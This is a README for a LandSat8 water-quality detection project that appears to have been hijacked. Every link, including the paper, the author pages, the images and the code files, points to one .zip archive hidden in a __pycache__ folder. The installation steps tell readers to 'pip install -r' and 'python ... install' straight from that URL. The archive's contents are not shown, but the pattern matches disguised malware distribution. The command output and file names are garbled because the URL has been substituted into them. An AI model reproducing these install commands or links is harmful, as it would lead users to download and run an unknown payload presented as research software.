### In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations
Salinity and turbidity detection of water ponds using satellite imagery. This is a statistical algorithm to analyze water quality in lakes/ponds/deltas using LandSat8 satellite time series data. The repo contains methods for detection on 2 types of datasets, the Commercial dataset (includes all the bands in a single .TIF file) and LandSat8 sensor dataset (Contains individual .TIF files for each band)

### [**Our Method**](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip)
### [*Published: Algorithms, Technologies, and Applications for Multispectral and Hyperspectral Imaging XXIX*](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip)
[Satish Kumar*](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip), [Rui Kou*](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip), [Vikram Jayaram](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip)

<img src="https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip" width="700">

This repository includes:
* Source code for Water Quality detection algorithm
* Dataloader for LandSat8 imagery and Satelytics imager
* Python code for Pansharpening multispectral image using panchromatic band
* Example datasample for generating color coded output, histogram, volume of water in pond/lake/delta etc

![supported versions](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip(3.5--3.8)-brightgreen/?style=flat&logo=python&color=green)
![GitHub license](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip)

The repo structure follows standard dataloader and utility function imported into the main code. Please consider citing our work if it is useful to you

### Requirements
* Python ≥ 3.5
* pip ≥ 21.1.0
* Virtualenv

### Installation
1. Clone this repository
2. Create a python (3.6 or greater) virtualenv
3. Activate the virtualenv
4. Install dependencies
```
pip install -r https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip
```
5. cd to rio-pansharpen directory and run the following commands
```
cd rio-pansharpen
rm -rf build/*
python https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip install
```
This finishes the environment setup for water quality detection

### Getting started
[https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip) is the primary file to run the code. To see the list of arguments run
```
python https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip --help
```
It dumps the following output
```
usage: https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip [-h] [-d DATA_DIR] [-r REPORT_PATH] [-vo VISUAL_OUT]
               [-ho HIST_OUT] [-ph PLOT_HIST] [-vt VOLUME]

optional arguments:
  -h, --help            show this help message and exit
  -d DATA_DIR, --data_dir DATA_DIR
                        path to data directory
  -r REPORT_PATH, --report_path REPORT_PATH
                        file to get location of ponds
  -vo VISUAL_OUT, --visual_out VISUAL_OUT
                        path to dir for qualitative output
  -ho HIST_OUT, --hist_out HIST_OUT
                        path to directory to dump histogram data
  -ph PLOT_HIST, --plot_hist PLOT_HIST
                        enable histogram plot
  -vt VOLUME, --volume VOLUME
                        enable volume and top 10 average csv file
```
Sample commands to run the code 
```
python https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip -d <path to data directory> -ph <True/False> -vt <True/False>
```
The output of above command will generate color coded output of water quality of each pond/lake in [visual_output](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip) directory and histogram plot in [histogram](https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip) directory. Along with that, it will generate 2 .csv files with names *https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip* and *https://raw.githubusercontent.com/Islem-Fakhfekh/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations/main/dataloader/__pycache__/In-situ-Water-quality-monitoring-in-Oil-and-Gas-operations-v2.7.zip*, which contains the relative volumne of water in each pond and expected value of top-10 pixel of water quality output respectively
